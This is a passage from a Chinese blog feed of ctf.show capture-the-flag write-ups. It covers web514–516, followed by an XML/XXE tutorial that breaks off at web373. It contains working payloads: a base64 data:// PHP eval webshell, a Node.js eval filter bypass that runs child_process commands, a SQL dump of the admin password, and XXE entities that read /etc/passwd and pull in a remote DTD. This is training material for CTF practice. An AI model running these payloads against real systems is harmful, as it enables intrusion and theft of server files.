file_put_contents(__DIR__.&#39;/../templates/&#39;.$name, $content);                $ret[&#39;msg&#39;]=&#39;文件上传成功&#39;;            &#125;                    &#125;else&#123;            $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;        &#125;        break;    default:        # code...        break;&#125;function waf($row)&#123;    $ret = false;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;name))&#123;        $ret=true;    &#125;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;type))&#123;        $ret=true;    &#125;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;des))&#123;        $ret=true;    &#125;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;path))&#123;        $ret=true;    &#125;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;id))&#123;        $ret=true;    &#125;    return $ret;&#125;die(json_encode($ret));</code></pre><p>这次我们直接包含一个2.sml文件,其中内容换成</p><pre><code class="php">data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4x</code></pre><p>但是需要绕过这行,简单使用数组绕过就好</p><pre><code class="php">if(preg_match(&#39;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#39;, $content))&#123;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414182124982.png" alt="image-20220414182124982"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414183409943.png" alt="image-20220414183409943"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414182908939.png" alt="image-20220414182908939"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414183420553.png" alt="image-20220414183420553"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414183454050.png" alt="image-20220414183454050"></p><h1 id="web515"><a href="#web515" class="headerlink" title="web515"></a>web515</h1><pre><code class="php">var express = require(&#39;express&#39;);var _= require(&#39;lodash&#39;);var router = express.Router();/* GET users listing. */router.get(&#39;/&#39;, function(req, res, next) &#123;  res.render(&#39;index&#39;, &#123; title: &#39;æˆ‘æ˜¯å¤è¯»æœº&#39; &#125;);&#125;);router.post(&#39;/&#39;,function(req,res,next)&#123;    if(req.body.user!=null)&#123;        msg = req.body.user;        if((msg.match(/proto|process|require|exec|var|&#39;|&quot;|:|\[|\]|[0-9]/))!==null || msg.length&gt;40)&#123;              res.render(&#39;index&#39;, &#123; title: &#39;æ•æ„Ÿä¿¡æ¯ä¸å¤è¯»&#39; &#125;);        &#125;else&#123;            res.render(&#39;index&#39;, &#123; title: eval(msg) &#125;);        &#125;    &#125;else&#123;        res.render(&#39;index&#39;, &#123; title: &#39;æˆ‘æ˜¯å¤è¯»æœº&#39; &#125;);    &#125;     &#125;);module.exports = router;</code></pre><p>过滤了一些字符</p><p>我们采用eval嵌套</p><pre><code class="php">index.php?a=require( &#39;child_process&#39; ).spawnSync( &#39;ls&#39;,[&#39;/&#39;] ).stdout.toString()POST&#123;&quot;user&quot;:&quot;eval(req.query.a)&quot;&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414184559957.png" alt="image-20220414184559957"></p><h1 id="web516"><a href="#web516" class="headerlink" title="web516"></a>web516</h1><p>关键语句,不太懂js</p><pre><code>ctx.body=&#39;&lt;h3&gt;Hello &#39;+user[0].username+&#39;&lt;/h3&gt; your name is: &#39;+user[0].username+&#39; your id is: &#39;+user[0].id+ &#39; your password is: &#39;+eval(&#39;md5(&#39;+user[0].password+&#39;)&#39;);</code></pre><pre><code class="php">2);const init=async()=&gt;&#123;await User.sequelize.query(&quot;select password from Users where username=&#39;admin&#39; into outfile &#39;/app/public/flag&#39;;&quot;,&#123;type:User.sequelize.SELECT&#125;);&#125;;init(</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414185417494.png" alt="image-20220414185417494"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414185459158.png" alt="image-20220414185459158"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414185522037.png" alt="image-20220414185522037"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/ctfshow/ctf.show/XXE/"/>
      <url>/ctfshow/ctf.show/XXE/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="xml简介"><a href="#xml简介" class="headerlink" title="xml简介"></a>xml简介</h2><p>xml被设计用来传输和存储数据</p><p>html被设计用来显示数据</p><p><strong>什么是xml</strong></p><ul><li>指可扩展标记语言</li><li>是一种标记语言,很类似于html</li><li>设计宗旨是传输数据,而非显示数据</li><li>标签没有被预定义.需要自行定义标签</li><li>被设计为具有自我描述性</li><li>是w3c的推荐标准</li></ul><p><strong>xml与html的主要差异</strong></p><p>xml不是html的替代</p><p>xml被设计为传输和存储数据,其焦点是数据的内容</p><p>html被设计来显示数据,其焦点是数据的外观</p><p>html旨在显示信息,xml旨在传输信息</p><p><strong>xml是不作为的</strong></p><p>xml被设计用来结构化 存储以及传输信息</p><pre><code>&lt;note&gt;&lt;to&gt;George&lt;/to&gt;&lt;from&gt;john&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;&lt;/note&gt;</code></pre><p>上面的语句仔细读一下就会发现像是john写给george的便签,存储为xml.</p><p>它仅仅是包装在xml标签中的纯粹的信息,我们需要在编写软件或者程序,才能传送接受和显示这个文档.</p><p><strong>xml仅仅是纯文本</strong></p><p>xml没有什么特别的,它仅仅是纯文本.有能力处理纯文本的软件都可以处理xml,不过,能够读懂xml的应用程序可以有针对性处理xml的处理xml的标签.标签的功能性意义依赖于应用程序的特性</p><p><strong>通过xml可以发明自己的标签</strong></p><p>上面的xml文档在xml标准中没有定义过,这些标签是由文档的创作者发明的,这是因为xml没有预定义的标签</p><p><strong>xml把数据从html中分离</strong></p><p>如果需要在heml文档中显示动态的数据,那么每当数据改变时将花费大量时间来编辑html,通过xml数据能够村塾在独立的xml文件汇总,这样就可以专注于使用html进行布局和显示,并确保修改底层数据不在需要对html进行任何的变动.通过几行的javascript,你就可以读取一个外部xml文件,然后更新html中的数据内容</p><h2 id="XML树结构"><a href="#XML树结构" class="headerlink" title="XML树结构"></a>XML树结构</h2><p>xml使用简单的具有自我描述性的语法</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-885-1&quot;&gt;&lt;note&gt;&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;&lt;/note&gt;</code></pre><p>第一行是xml声明.它定义xml的版本(1.0)和使用的编码(ISO-8859-1 &#x3D; Latin-1&#x2F;西欧字符集)</p><pre><code>&lt;node&gt;</code></pre><p>表示的是文档的根元素(就像:本文档是一个便签)</p><pre><code>&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;</code></pre><p>这四个描述里4个子元素</p><pre><code>&lt;/note&gt;</code></pre><p>定义根元素</p><p><strong>xml文档形成一种树结构</strong></p><p>xml文档中必须包含根元素.该元素使所有其它元素的父元素</p><p>xml文档中的元素形成了一颗文档树.这颗树从根部开始,并扩展到树的最顶部</p><p>所有元素都可以拥有子元素</p><pre><code>&lt;root&gt;  &lt;child&gt;    &lt;subchild&gt;.....&lt;/subchild&gt;  &lt;/child&gt;&lt;/root&gt;</code></pre><p>父 子以及同胞等术语用于描述元素之间的关系.父元素拥有子元素.相同层级上的子元素称为同胞.所有元素均可拥有文本内容和属性</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291303955.png" alt="image-20220329130316921"></p><pre><code>&lt;bookstore&gt;&lt;book category=&quot;COOKING&quot;&gt;  &lt;title lang=&quot;en&quot;&gt;Everyday Italian&lt;/title&gt;   &lt;author&gt;Giada De Laurentiis&lt;/author&gt;   &lt;year&gt;2005&lt;/year&gt;   &lt;price&gt;30.00&lt;/price&gt; &lt;/book&gt;&lt;book category=&quot;CHILDREN&quot;&gt;  &lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt;   &lt;author&gt;J K. Rowling&lt;/author&gt;   &lt;year&gt;2005&lt;/year&gt;   &lt;price&gt;29.99&lt;/price&gt; &lt;/book&gt;&lt;book category=&quot;WEB&quot;&gt;  &lt;title lang=&quot;en&quot;&gt;Learning XML&lt;/title&gt;   &lt;author&gt;Erik T. Ray&lt;/author&gt;   &lt;year&gt;2003&lt;/year&gt;   &lt;price&gt;39.95&lt;/price&gt; &lt;/book&gt;&lt;/bookstore&gt;</code></pre><p>上面的根元素是&lt;bookstore&gt;.文档中的所有&lt;book&gt;元素都包含在&lt;bookstore&gt;中&lt;book&gt;元素中有四个子元素:&lt;title&gt; &lt;author&gt; &lt;year&gt; &lt;price&gt;</p><h2 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h2><p><strong>xml中所有的元素都必须有关闭标签</strong></p><pre><code>&lt;p&gt;This is a paragraph&lt;p&gt;This is another paragraph&lt;p&gt;This is a paragraph&lt;/p&gt;&lt;p&gt;This is another paragraph&lt;/p&gt;  </code></pre><p><strong>xml标签对大小写敏感</strong></p><pre><code>&lt;Message&gt;这是错误的。&lt;/message&gt;&lt;message&gt;这是正确的。&lt;/message&gt; </code></pre><p><strong>xml必须正确的嵌套</strong></p><pre><code>&lt;b&gt;&lt;i&gt;This text is bold and italic&lt;/b&gt;&lt;/i&gt;&lt;b&gt;&lt;i&gt;This text is bold and italic&lt;/i&gt;&lt;/b&gt;</code></pre><p><strong>xml文档中必须有根元素</strong></p><pre><code>&lt;root&gt;  &lt;child&gt;    &lt;subchild&gt;.....&lt;/subchild&gt;  &lt;/child&gt;&lt;/root&gt;</code></pre><p><strong>xml的属性值必须加引号</strong></p><p>与html类似,xml也可以拥有属性(名称&#x2F;值的对).在xml中,xml的属性值必须加引号</p><pre><code>&lt;note date=08/08/2008&gt;&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;/note&gt; &lt;note date=&quot;08/08/2008&quot;&gt;&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;/note&gt; </code></pre><p>在第一个文档中的错误的是 note 元素中的date属性没有加引号</p><p><strong>实体引用</strong></p><p>在xml中,一些字符拥有特殊的意义,如果你把字符”&lt;”放在xml元素中,会发生错误,这是因为解析器会把他当成新元素的开始</p><pre><code>&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt; </code></pre><p>需要使用实体引用来代替”&lt;”字符</p><p>在 XML 中，有 5 个预定义的实体引用：</p><table><thead><tr><th>&lt;</th><th>&lt;</th><th>小于</th></tr></thead><tbody><tr><td>&gt;</td><td>&gt;</td><td>大于</td></tr><tr><td>&amp;</td><td>&amp;</td><td>和号</td></tr><tr><td>&amp;apos;</td><td>‘</td><td>单引号</td></tr><tr><td>&quot;</td><td>“</td><td>引号</td></tr></tbody></table><p><strong>XML 中的注释</strong></p><pre><code>&lt;!-- This is a comment --&gt; </code></pre><p><strong>在 XML 中，空格会被保留</strong></p><p>在 XML 中，文档中的空格不会被删节。</p><pre><code>HTML:    Hello           my name is David.输出:    Hello my name is David.</code></pre><p><strong>XML 以 LF 存储换行</strong></p><p>在windows应用程序中,换行通常以一对字符来存储:回车符(CR)和换行符(LF).这对字符与打字机设置新行的动作有相似之处.在unix应用程序汇总,新行以(LF)字符存储.而mac应用程序使用CR来存储新行</p><p><strong>XMLDTD</strong></p><p>DTD的作用是定义xml文档的结构,他使用一系列合法的元素来定义文档结构</p><pre><code>&lt;!DOCTYPE note [  &lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!ELEMENT to      (#PCDATA)&gt;  &lt;!ELEMENT from    (#PCDATA)&gt;  &lt;!ELEMENT heading (#PCDATA)&gt;  &lt;!ELEMENT body    (#PCDATA)&gt;]&gt; </code></pre><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><h3 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h3><p>文档类型定义(DTD)可定义合法的xml文档构建模块.它使用一系列合法的元素来定义文档的结构DTD可被成行的声明在xml文档中,也可以做为一个外部引用</p><p><strong>内部的DOCTYPE声明</strong></p><p>假如DTD被包含在您的xml源文件中,它应当通过下面的语法包装在一个DOCTYPE声明汇总</p><pre><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></pre><p>带有 DTD 的 XML 文档实例</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!ELEMENT to      (#PCDATA)&gt;  &lt;!ELEMENT from    (#PCDATA)&gt;  &lt;!ELEMENT heading (#PCDATA)&gt;  &lt;!ELEMENT body    (#PCDATA)&gt;]&gt;&lt;note&gt;  &lt;to&gt;George&lt;/to&gt;  &lt;from&gt;John&lt;/from&gt;  &lt;heading&gt;Reminder&lt;/heading&gt;  &lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;&lt;/note&gt;</code></pre><p>以上DTD的解释</p><ul><li>!DOCYPYE note(第二行)定义此文档是note类型的文档</li><li>!ELEMENT note(第三行)定义note元素有四个元素:”to  from heading body”</li><li>!ELEMENT to(第四行)定义to元素为”#PCDATA”类型</li><li>!ELEMENT from(第五行)定义from元素为”#PCDATA”类型</li><li>!ELEMENT heading(第六行)定义heading元素为”#PCDATA”类型</li><li>!ELEMENT body(第七行)定义body元素为”#PCDATA”类型</li></ul><p><strong>外部文档声明</strong></p><p>加入DTD位于xml源文件的外部,那么他应通过下面的语法被封装在一个DOCTYPE定义中</p><pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></pre><p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;&lt;/note&gt; </code></pre><p>这是包含 DTD 的 “note.dtd” 文件</p><pre><code>&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;</code></pre><p><strong>为什么使用DTD</strong></p><p>每一个xml文件均可携带有一个有关其自身格式的描述.独立的团体可以一致的使用某个标准的DTD来交换数据.应用程序也可以使用某个标准的DTD来验证从外部接受到的数据.还可以使用DTD来验证自身的数据.</p><h3 id="DTD-XML-构建模块"><a href="#DTD-XML-构建模块" class="headerlink" title="DTD - XML 构建模块"></a>DTD - XML 构建模块</h3><p><strong>PCDATA</strong></p><p>PCDATA 的意思是被解析的字符数据（parsed character data）。可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p><p><strong>CDATA</strong></p><p>CDATA 的意思是字符数据（character data）。CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h3 id="DTD-实体"><a href="#DTD-实体" class="headerlink" title="DTD - 实体"></a>DTD - 实体</h3><p><strong>一个内部实体声明</strong></p><p>语法：</p><pre><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre><p>例子：</p><p>DTD 例子:</p><pre><code>&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</code></pre><p>XML 例子:</p><pre><code>&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</code></pre><p>注释: 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p><p><strong>一个外部实体声明</strong></p><p>语法：</p><pre><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre><p>例子：</p><p>DTD 例子:</p><pre><code>&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</code></pre><p>XML 例子:</p><pre><code>&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</code></pre><h1 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么"></a>XXE是什么</h1><p>介绍xxe之前,先说一下普通的xml注入,这个的利用面比较狭窄.如果有的话应该也是逻辑漏洞</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203282117029.png" alt="image-20220328211733960"></p><p>既然能插入xml代码,那么我们肯定不能善罢甘休,我们需要更多,于是就出现了xxe</p><p>xxe(xml external ectity injection)全称为xml外部实体注入,从名字就能看出来,这是一个注入漏洞,注入的是什么?xml外部实体.如果能够注入外部实体并且成功解析的话,这就会大大扩展我们xml注入的攻击面</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>xml是一种非常流行的标记语言,在1990年代后期首次标准化,并被无数的软件项目所利用.它用于配置文件,文档格式(如ooxml odf pdf rss…) ,图像格式(svg  exif标题)和网络协议(webdav caldav xmlrpc soap xmpp saml xacml …),它应用的如此的普遍以至于它出现任何的问题都会带来灾难性的结果</p><p>在解析外部实体的过程中,xml解析器可以根据url中指定的方案(协议)来查询各种网络协议和服务(dns,ftp http smb等)) 外部实体对于在文档中创建动态引用非常有用,这样对引用资源所做的任何更改都会在文档中自动更新,但是,在处理外部实体时,可以针对应用程序启动许多攻击.这些攻击包括泄露本地系统文件,这些文件可能包含密码和私人用户数据等敏感数据,或者利用各种方案的网络访问功能来操纵内部应用程序.通过将这些攻击与其他实现缺陷相结合,这些攻击的范围可以扩展到客户端内存损坏,任意代码执行,甚至服务中断,具体取决于这些攻击的上下文</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>xml文档有自己的一个格式规范,这个格式规范是一个叫做dtd的东西控制的,它就是下面这个样子</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义&lt;!DOCTYPE message [&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;&lt;!ELEMENT receiver (#PCDATA)&gt;&lt;!ELEMENT sender (#PCDATA)&gt;&lt;!ELEMENT header (#PCDATA)&gt;&lt;!ELEMENT msg (#PCDATA)&gt;</code></pre><p>上面这个dtd就定义了xml的根元素是message.然后根元素下面有一些子元素,那么xml到时候必须像下面这样写</p><pre><code>&lt;message&gt;&lt;receiver&gt;Myself&lt;/receiver&gt;&lt;sender&gt;Someone&lt;/sender&gt;&lt;header&gt;TheReminder&lt;/header&gt;&lt;msg&gt;This is an amazing book&lt;/msg&gt;&lt;/message&gt;</code></pre><p>其实除了在dtd中定义元素(其实就是对应xml中的标签)以外,我们还能在dtd中定义实体(对应xml标签中的内容),毕竟ml中除了能标签以外,还需要有些内容时固定的</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</code></pre><p>这里定义元素为any说明接受任何元素,但是定义了一个xml的实体(实体其实可以看成一个变量,到时候我们可以再xml中通过&amp;符号进行引用),那么xml就可以写成这样</p><pre><code>&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>我们使用&amp;xxe对上面定义的xxe实体进行了引用,到时候输出的时候&amp;xxe就会被”test”替换</p><p>实体分为两种,内部实体和外部实体,上面的例子就是内部实体.但是实体实际上可以从外部的dtd文件中引用,</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便</p><p>当然还有一种引用方式是使用公用dtd的方法</p><pre><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></pre><p>这个在我们的攻击中也可以起到和system一样的作用</p><p>我们上面已经将实体分成了两个派别(内部实体和外部实体),但是实际上从另一个角度看,实体也可以分成两个派别(通用实体和参数实体)</p><ol><li><p>通用实体</p><p> 用&amp;实体名;引用的实体,它在dtd汇总定义,在xml文档中引用</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; &lt;updateProfile&gt;      &lt;firstname&gt;Joe&lt;/firstname&gt;      &lt;lastname&gt;&amp;file;&lt;/lastname&gt;      ... &lt;/updateProfile&gt;</code></pre></li><li><p>参数实体</p><ol><li>使用 % 实体名(这里面空格不能少)在dtd中定义,并且只能在dtd中使用%实体名;引用</li><li>只有在dtd文件中,参数实体的声明才能引用其他实体</li><li>和通用实体一样,参数实体也可以外部使用</li></ol><pre><code>&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; %an-element; %remote-dtd;</code></pre><p> 参数实体在我们blind xxe中起到了至关重要的作用</p></li></ol><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>这里既然能够读取dtd那我们是不是可以将路径换一换,换成敏感文件的路径,然后读敏感文件</p><h3 id="有回显的读取本地敏感文件-normal-xxe"><a href="#有回显的读取本地敏感文件-normal-xxe" class="headerlink" title="有回显的读取本地敏感文件(normal xxe)"></a>有回显的读取本地敏感文件(normal xxe)</h3><p>这个实验的攻击场景模拟的是在服务能够接收并解析xml格式的输入并有回显的时候,我们就能输入我们自定义的xml代码,通过引用外部实体的方法,引用服务器上面的文件</p><p>在服务器上放上解析xml的php代码</p><pre><code class="php">&lt;?php    libxml_disable_entity_loader (false);    $xmlfile = file_get_contents(&#39;php://input&#39;);    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     $creds = simplexml_import_dom($dom);    echo $creds;?&gt;</code></pre><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203282243027.png" alt="image-20220328224301972"></p><p>这是由于这个文件没有过什么特殊符号,</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203282246118.png" alt="image-20220328224618048"></p><p>但是如果变成这个文件就会报错</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203282246999.png" alt="image-20220328224642941"></p><p>如果有些内容可能不想让解析引擎解析执行,而是当做原始的内容处理,用于把整个字段数据解析为纯字符数据而不是标记的情况包含大量的&lt;&gt;&amp;或者”只读,CDATA节中的所有字符都会被当做元素字符数据的常量部分,而不是xml标记</p><pre><code>&lt;![CDATA[xxxxxxxx]]&gt;</code></pre><p>可以输入任意字符除了]]&gt;不能嵌套,用处是玩意某个标签内容包含特殊字符或者不确定字符,我们可以用CDATA包起来</p><p>那么我们把我们的读出来的数据放在CDATA中输出就能进行绕过个,但是怎么做到,我们来分析一下</p><pre><code>...&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>引用并不接受可能会引起xml格式混乱的字符(在xml中,有时实体内包含了一些字符,如&amp; &lt; &gt; “ ‘ 等.这些均需要对其进行转义,否则会对xml解析器生成错误,我们想在引用的两边加上”&lt;![cdata [“”]]&gt;”但是好像没有任何语法告诉我们字符串能拼接,于是能不能使用多个实体连续引用的方法</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;!ENTITY end&quot;]]&gt;&quot;]&gt;&lt;creds&gt;&amp;goodies;&amp;end;&lt;/creds&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291120298.png" alt="image-20220329112005248"></p><p>注意这里面的两个个实体都是字符串的形式,连在一起会报错,这说明我们不能在xml中进行匹配,而是需要在拼接以后在在xml中调用,那么要想在dtd中拼接,我们知道我们只有一种选择,就是使用参数实体</p><p>本地起一个服务放入xml.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291415105.png" alt="image-20220329141502004"></p><p>远程利用服务上面放入eval.dtd文件</p><p>eval.dtd</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p>payload</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % goodies SYSTEM &quot;file:///D:/Download/test.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.5.149/eval.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291416473.png" alt="image-20220329141644415"></p><p>注意这里提一个点,如果是在java中还有一个协议能够代替file协议,那就是netdoc</p><p>但是,本身别人的服务器上的xml就不是输出用的,,一般都是用于配置或者在某些极端情况利用其他漏洞能恰好实例化解析xml的类,因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法(外带)</p><p>想要外带就必须能发起请求,那么什么地方能发起请求?很明显就是我们的外部实体定义的时候,其实光发起请求还不行,我们还得能够把我们的数据传出去,而我们的数据本身也是一个对外的请求,也就是说,我们需要在请求中引用另一次请求的结果,分析下来只有我们的参数实体能做到了(并且根据规范,我们必须在一个dtd文件中才能完成”请求中引用另一次请求的结果”的要求)</p><h3 id="无回显读取本地敏感文件-没看懂"><a href="#无回显读取本地敏感文件-没看懂" class="headerlink" title="无回显读取本地敏感文件(没看懂)"></a>无回显读取本地敏感文件(没看懂)</h3><p><a href="https://xz.aliyun.com/t/3357#toc-8">https://xz.aliyun.com/t/3357#toc-8</a></p><h1 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h1><p>&#96;&#96;&#96;php<br>&lt;?php</p><p>&#x2F;*</p><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p> Author: h1xa<br> Date:   2021-01-07 12:59:52<br> Last Modified by:   h1xa<br> Last Modified time: 2021-01-07 13:36:47<br> email: <a href="mailto:&#104;&#49;&#x78;&#97;&#64;&#x63;&#116;&#102;&#x65;&#x72;&#x2e;&#99;&#111;&#x6d;">&#104;&#49;&#x78;&#97;&#64;&#x63;&#116;&#102;&#x65;&#x72;&#x2e;&#99;&#111;&#x6d;</a><br> link: <a href="https://ctfer.com/">https://ctfer.com</a></p><p>*&#x2F;</p><p>error_reporting(0);<br>libxml_disable_entity_loader(false);#允许加载外部实体<br>$xmlfile &#x3D; 